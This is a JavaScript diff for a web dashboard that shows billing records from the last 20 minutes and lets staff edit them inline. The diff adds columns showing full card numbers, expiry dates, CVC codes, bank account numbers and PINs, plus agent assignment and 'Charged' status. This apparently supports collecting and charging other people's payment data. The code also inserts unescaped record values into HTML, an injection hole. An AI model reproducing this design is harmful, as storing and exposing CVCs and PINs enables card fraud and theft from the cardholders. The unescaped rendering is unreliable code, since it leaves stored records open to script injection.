@@ -194,43 +194,67 @@ document.getElementById('billingForm').addEventListener('submit', async (e) => {
    RECENT BILLING TABLE & INLINE EDIT LOGIC
    ========================================= */
 
-// 1. Load Data Function
 async function loadRecentBilling() {
     try {
-        // Fetch last 50 records to ensure we catch everything in the 20min window
         const res = await fetch('/api/get-lead?type=billing&limit=50');
         const json = await res.json();
         const tbody = document.getElementById('recentBillingTable');
         
-        if(!tbody) return; // Guard clause
+        if(!tbody) return; 
         tbody.innerHTML = '';
 
         if(json.data && Array.isArray(json.data)) {
             const now = new Date();
-            const twentyMinsAgo = new Date(now.getTime() - 20 * 60000); // 20 minutes ago
+            const twentyMinsAgo = new Date(now.getTime() - 20 * 60000); 
 
             json.data.forEach(row => {
-                // Parse Timestamp (Adjust logic if your timestamp format differs)
                 const leadTime = new Date(row.Timestamp || row.created_at);
                 
-                // FILTER: Only show if within last 20 minutes
                 if (leadTime >= twentyMinsAgo) {
                     const tr = document.createElement('tr');
-                    tr.className = "hover:bg-slate-700/50 transition";
+                    tr.className = "hover:bg-slate-700/50 transition whitespace-nowrap";
+
+                    // Helper for cleaner HTML generation
+                    const cell = (field, val, color='text-slate-300') => 
+                        `<td contenteditable="true" onblur="saveBillingCell('${row.Record_ID}', '${field}', this)" 
+                             class="p-4 ${color} focus:bg-slate-700 outline-none rounded min-w-[100px]">${val || ''}</td>`;
+
+                    // Generate Agent Dropdown
+                    const agentOptions = window.PAGE_AGENTS.map(a => 
+                        `<option value="${a}" ${a === row.Agent ? 'selected' : ''}>${a}</option>`
+                    ).join('');
+
                     tr.innerHTML = `
-                        <td contenteditable="true" onblur="saveBillingCell('${row.Record_ID}', 'Name', this)" class="p-4 text-white focus:bg-slate-700 outline-none rounded">${row.Name || ''}</td>
-                        <td contenteditable="true" onblur="saveBillingCell('${row.Record_ID}', 'Provider', this)" class="p-4 text-slate-300 focus:bg-slate-700 outline-none rounded">${row.Service || row.Provider || ''}</td>
-                        <td contenteditable="true" onblur="saveBillingCell('${row.Record_ID}', 'Phone', this)" class="p-4 text-slate-300 focus:bg-slate-700 outline-none rounded">${row['Ph Number'] || row.Phone || ''}</td>
-                        <td contenteditable="true" onblur="saveBillingCell('${row.Record_ID}', 'Charge', this)" class="p-4 font-mono font-bold text-green-400 focus:bg-slate-700 outline-none rounded">${row.Charge || ''}</td>
+                        <td class="p-4">
+                            <select onchange="saveBillingCell('${row.Record_ID}', 'agent', this)" 
+                                    class="bg-slate-900 border border-slate-600 rounded px-2 py-1 text-white text-sm outline-none focus:border-green-500 w-32">
+                                <option value="">--</option>
+                                ${agentOptions}
+                            </select>
+                        </td>
+                        <td class="p-4 text-xs text-slate-500 font-mono">${row.Record_ID || ''}</td>
+                        ${cell('Name', row.Name, 'text-white font-bold')}
+                        ${cell('Phone', row.Phone)}
+                        ${cell('Email', row.Email)}
+                        ${cell('Address', row.Address)}
+                        ${cell('CardHolder', row.CardHolder)}
+                        ${cell('CardNumber', row.CardNumber, 'font-mono text-yellow-100')}
+                        ${cell('ExpDate', row.ExpDate)}
+                        ${cell('CVC', row.CVC, 'text-red-400 font-bold')}
+                        ${cell('Charge', row.Charge, 'text-green-400 font-mono font-bold')}
+                        ${cell('Provider', row.Provider)}
+                        ${cell('LLC', row.LLC)}
+                        ${cell('AccountNo', row.AccountNo)}
+                        ${cell('PIN', row.PIN)}
+                        <td class="p-4"><span class="px-2 py-1 rounded text-xs font-bold ${row.Status === 'Charged' ? 'bg-green-900 text-green-300' : 'bg-yellow-900 text-yellow-300'}">${row.Status || 'Pending'}</span></td>
                         <td class="p-4 text-xs text-slate-500">${row.Timestamp}</td>
                     `;
                     tbody.appendChild(tr);
                 }
             });
             
-            // Show message if empty
             if (tbody.children.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="5" class="p-6 text-center text-slate-500 italic">No submissions in the last 20 minutes.</td></tr>`;
+                tbody.innerHTML = `<tr><td colspan="17" class="p-6 text-center text-slate-500 italic">No submissions in the last 20 minutes.</td></tr>`;
             }
         }
     } catch (e) {
@@ -240,38 +264,47 @@ async function loadRecentBilling() {
 
 // 2. Save Cell Function
 async function saveBillingCell(id, field, el) {
-    const val = el.innerText.trim();
-    // Visual Feedback: Yellow while saving
+    const val = el.tagName === 'SELECT' ? el.value : el.innerText.trim();
+    
+    // DB Key Mapping (Frontend Name -> Backend Key)
+    // Add specific mappings if 'field' name doesn't match 'update_field_inline' logic
+    let dbField = field;
+    if(field === 'CardHolder') dbField = 'card_holder';
+    if(field === 'CardNumber') dbField = 'card_number';
+    if(field === 'ExpDate') dbField = 'exp_date';
+    if(field === 'CVC') dbField = 'cvc';
+    if(field === 'LLC') dbField = 'llc';
+    if(field === 'AccountNo') dbField = 'account_number';
+    if(field === 'PIN') dbField = 'pin_code';
+
     const originalBg = el.style.backgroundColor;
-    el.style.backgroundColor = '#422006'; // Dark Orange/Brown background
+    if(el.tagName !== 'SELECT') el.style.backgroundColor = '#422006'; 
 
     try {
         await fetch('/api/update_field', {
             method: 'POST',
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: `type=billing&id=${id}&field=${field}&value=${encodeURIComponent(val)}`
+            body: `type=billing&id=${id}&field=${dbField}&value=${encodeURIComponent(val)}`
         });
         
-        // Success Feedback: Green flash
-        el.style.backgroundColor = '#064e3b'; // Dark Green
-        setTimeout(() => el.style.backgroundColor = originalBg, 500);
-        
+        if(el.tagName !== 'SELECT') {
+            el.style.backgroundColor = '#064e3b';
+            setTimeout(() => el.style.backgroundColor = originalBg, 500);
+        } else {
+            el.classList.add('border-green-500');
+            setTimeout(() => el.classList.remove('border-green-500'), 500);
+        }
     } catch (e) {
-        // Error Feedback: Red flash
-        el.style.backgroundColor = '#7f1d1d';
+        if(el.tagName !== 'SELECT') el.style.backgroundColor = '#7f1d1d';
         alert("Failed to save change.");
     }
 }
 
-// 3. Auto-Refresh Interval
-// Load immediately
+// 3. Auto-Refresh Logic
 document.addEventListener('DOMContentLoaded', loadRecentBilling);
-// Refresh every 30 seconds
 setInterval(loadRecentBilling, 30000); 
 
-// 4. Hook into existing Submit to refresh table immediately
 const billingFormRef = document.getElementById('billingForm');
 if(billingFormRef) {
     billingFormRef.addEventListener('submit', () => setTimeout(loadRecentBilling, 1000));
 }
-
